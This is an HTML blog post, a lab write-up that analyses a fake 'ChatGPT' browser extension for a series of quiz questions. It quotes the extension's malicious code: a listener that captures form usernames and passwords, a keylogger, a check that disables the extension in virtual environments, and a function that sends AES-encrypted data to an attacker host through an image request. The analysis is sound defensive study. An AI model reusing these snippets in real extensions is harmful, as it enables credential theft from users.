@@ -1,0 +1,193 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>FakeGPT — A Malicious ChatGPT Browser Extension — cuddest</title>
+<meta name="description" content="FakeGPT — A Malicious ChatGPT Browser Extension">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Geist:wght@300;400;500;600&family=JetBrains+Mono:wght@400;500;600;700&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="../css/style.css">
+<link rel="stylesheet" href="../css/writeups.css">
+</head>
+<body>
+
+<header class="topbar">
+  <div class="topbar-in">
+    <a class="logo" href="../index.html#writing" aria-label="cuddest — back to writeups">
+      <svg class="logo-mark" viewBox="0 0 24 24" aria-hidden="true">
+        <rect x="1.6" y="1.6" width="20.8" height="20.8" rx="2"
+              fill="none" stroke="currentColor" stroke-width="1.5"/>
+        <path d="M15.6 8.9a4.2 4.2 0 1 0 0 6.2" fill="none"
+              stroke="var(--logo-accent)" stroke-width="1.9" stroke-linecap="round"/>
+      </svg>
+      <span class="logo-word">uddest</span>
+    </a>
+    <span class="topbar-cta"><a class="ulink" href="../index.html#writing">← All writeups</a></span>
+  </div>
+</header>
+
+<article class="wpost">
+  <header class="wpost-head">
+    <p class="wpost-meta"><span>2026-03-28</span><span>10 min read</span></p>
+    <h1>FakeGPT — A Malicious ChatGPT Browser Extension</h1>
+  </header>
+  <div class="wpost-body">
+<h1>Scenario:</h1>
+<p>An alert came to the security team about a suspicious activity in the organization network with several emplyees reporting unusual behavior in their browsers after installing some new extension called "ChatGPT" , in this lab we gonna analyze this extension.</p>
+<h1>Questions:</h1>
+<ol>
+<li><strong><em>Which encoding method does the browser extension use to obscure target URLs, making them more difficult to detect during analysis?</em></strong></li>
+</ol>
+<p>at first glance looking at app.js file, we can see:</p>
+<p><code>const targets = [_0xabc1('d3d3LmZhY2Vib29rLmNvbQ==')];</code></p>
+<p>this obfuscated list of encoded links declaration screams B64  encoding, CyberChef confirms that.</p>
+<p><img alt="img" src="images/Pasted image 20260328222326.png" /></p>
+<div class="answer">Base64</div>
+
+<ol start="2">
+<li><strong><em>Which website does the extension monitor for data theft, targeting user accounts to steal sensitive information?</em></strong></li>
+</ol>
+<div class="answer">www.facebook.com</div>
+
+<ol start="3">
+<li><strong><em>Which type of HTML element is utilized by the extension to send stolen data?</em></strong></li>
+</ol>
+<p>moving on with the app.js analyzis, we reach this function:</p>
+<pre><code>function sendToServer(encryptedData) {
+    var img = new Image();
+    img.src = 'https://Mo.Elshaheedy.com/collect?data=' + encodeURIComponent(encryptedData);
+    document.body.appendChild(img);
+}
+</code></pre>
+<p>that is a smart way to transfer stolen data in <code>encryptedData</code>, by initializing this img element that gets its data ( image ) by a <strong>GET</strong> request to the attacker server <strong>(Mo.Elshaheedy.com)</strong>,  we can see that the <code>encryptedData</code> is attached at the end of the <strong>url</strong>, which will be logged at the attacker's server.</p>
+<div class="answer"><img></div>
+
+<ol start="4">
+<li><strong><em>What is the first specific condition in the code that triggers the extension to deactivate itself?</em></strong></li>
+</ol>
+<p>loader.js seems where to look for any evasion techniques, and it seems that our attacker even documented the code for us !</p>
+<p><code>(function() {</code><br />
+<code>var _0xabc1 = function(_0x321a) {</code><br />
+<code>return _0x321a;</code><br />
+<code>};</code><br />
+<code>// Check if the browser is in a virtual environment</code><br />
+<code>if (navigator.plugins.length === 0 || /HeadlessChrome/.test(navigator.userAgent)) {</code><br />
+<code>alert("Virtual environment detected. Extension will disable itself.");</code><br />
+<code>chrome.runtime.onMessage.addListener(() =&gt; { return false; });</code><br />
+<code>}</code></p>
+<p>we can see that the attacker is checking if there is at least one plugin installed, and stops if none are (<strong>0 plugins enabled or installed suggests a scanner or a bot behavior instead of a normal browser </strong>).</p>
+<div class="answer">navigator.plugins.length === 0</div>
+
+<ol start="5">
+<li><strong><em>Which event does the extension capture to track user input submitted through forms?</em></strong></li>
+</ol>
+<p>going back to app.js, we can find this part where the attacker is focusing on extracting the <strong>username</strong> and <strong>password</strong> on a <strong>submit</strong> event:</p>
+<p><code>if (targets.indexOf(window.location.hostname) !== -1) {</code><br />
+<code>document.addEventListener('submit', function(event) {</code><br />
+<code>let form = event.target;</code><br />
+<code>let formData = new FormData(form);</code><br />
+<code>let username = formData.get('username') || formData.get('email');</code><br />
+<code>let password = formData.get('password');</code></p>
+<pre><code>        `if (username &amp;&amp; password) {`
+            `exfiltrateCredentials(username, password);`
+        `}`
+    `});`
+</code></pre>
+<div class="answer">submit</div>
+
+<ol start="6">
+<li><strong><em>Which API or method does the extension use to capture and monitor user keystrokes?</em></strong></li>
+</ol>
+<p>to the next bloc of code we find :</p>
+<pre><code>    document.addEventListener('keydown', function(event) {
+        var key = event.key;
+        exfiltrateData('keystroke', key);
+    });
+}
+</code></pre>
+<p>the <strong>keydown</strong> listener is the one wating for user typing.</p>
+<div class="answer">keydown</div>
+
+<ol start="7">
+<li><strong><em>Which API or method does the extension use to capture and monitor user keystrokes?</em></strong></li>
+</ol>
+<p>go back to part 3.</p>
+<div class="answer">Mo.Elshaheedy.com</div>
+
+<ol start="8">
+<li>
+<p><strong><em>Which function in the code is used to exfiltrate user credentials, including the username and password?</em></strong></p>
+<p>the function down here that takes the username and password captured in the submit event as we seen up in this writeup, found in app.js, calls <strong>encryptPayload</strong> to encrypt the payload and <strong>snedToServer</strong> which we will see later, to send the encrypted payload to the attacker server:</p>
+<p><code>function exfiltrateCredentials(username, password) {</code><br />
+<code>const payload = { user: username, pass: password, site: window.location.hostname };</code><br />
+<code>const encryptedPayload = encryptPayload(JSON.stringify(payload));</code><br />
+<code>sendToServer(encryptedPayload);</code><br />
+<code>}</code></p>
+</li>
+</ol>
+<div class="answer">exfiltrateCredentials(username, password);</div>
+
+<ol start="9">
+<li><strong><em>Which encryption algorithm is applied to secure the data before sending?</em></strong></li>
+</ol>
+<p>Always with app.js, the next bloc we find the called function uo there in <strong>exfiltrateCredentials</strong>:</p>
+<pre><code>function encryptPayload(data) {
+    const key = CryptoJS.enc.Utf8.parse('SuperSecretKey123');
+    const iv = CryptoJS.lib.WordArray.random(16);
+    const encrypted = CryptoJS.AES.encrypt(data, key, { iv: iv });
+    return iv.concat(encrypted.ciphertext).toString(CryptoJS.enc.Base64);
+}
+</code></pre>
+<p>which uses AES to encrypt the payload before sending it.</p>
+<ol start="10">
+<li><strong><em>What does the extension access to store or manipulate session-related data and authentication information?</em></strong></li>
+</ol>
+<p>Took some time at first because i assumed some sort of cookies or token to be accessed, but nothing was found in app.js or crypto.js, but i was ignoring another important file: manifesto.js:</p>
+<p><strong><em>{</em></strong><br />
+<strong><em>"manifest_version": 2,</em></strong><br />
+<strong><em>"name": "ChatGPT",</em></strong><br />
+<strong><em>"version": "1.0",</em></strong><br />
+<strong><em>"description": "An AI-powered assistant extension.",</em></strong><br />
+<strong><em>"permissions": [</em></strong><br />
+<strong><em>"tabs",</em></strong><br />
+<strong><em>"http://</em>/",</strong><em><br />
+</em><strong>"https://<em>/",</em></strong><br />
+<strong><em>"storage",</em></strong><br />
+<strong><em>"webRequest",</em></strong><br />
+<strong><em>"webRequestBlocking",</em></strong><br />
+<strong><em>"cookies"</em></strong><br />
+<strong><em>],</em></strong><br />
+<strong><em>"background": {</em></strong><br />
+<strong><em>"scripts": ["system/loader.js"],</em></strong><br />
+<strong><em>"persistent": true</em></strong><br />
+<strong><em>},</em></strong><br />
+<strong><em>"content_scripts": [</em></strong><br />
+<strong><em>{</em></strong><br />
+<strong><em>"matches": ["<all_urls>"],</em></strong><br />
+<strong><em>"js": ["core/app.js"]</em></strong><br />
+<strong><em>}</em></strong><br />
+<strong><em>],</em></strong><br />
+<strong><em>"browser_action": {</em></strong><br />
+<strong><em>"default_popup": "assets/ui.html"</em></strong><br />
+<strong><em>}</em></strong><br />
+<strong><em>}</em></strong></p>
+<p>which is a json file that defines rules, permissions and act as the id card of the extention (<strong>used for chromium based extensions</strong>), we can see clearly that the first place that stores auth data is cookies in the permissions list.</p>
+<div class="answer">cookies</div>
+  </div>
+  <footer class="wpost-foot">
+    <a class="btn-line" href="../index.html#writing">← Back to all writeups</a>
+  </footer>
+</article>
+
+<footer class="colophon">
+  <div class="wrap colophon-in">
+    <span>© 2026 Ayoub Touati</span>
+    <span>Set in Geist &amp; JetBrains Mono</span>
+    <span><a class="ulink" href="../index.html#writing">Back to the site</a></span>
+  </div>
+</footer>
+
+</body>
+</html>
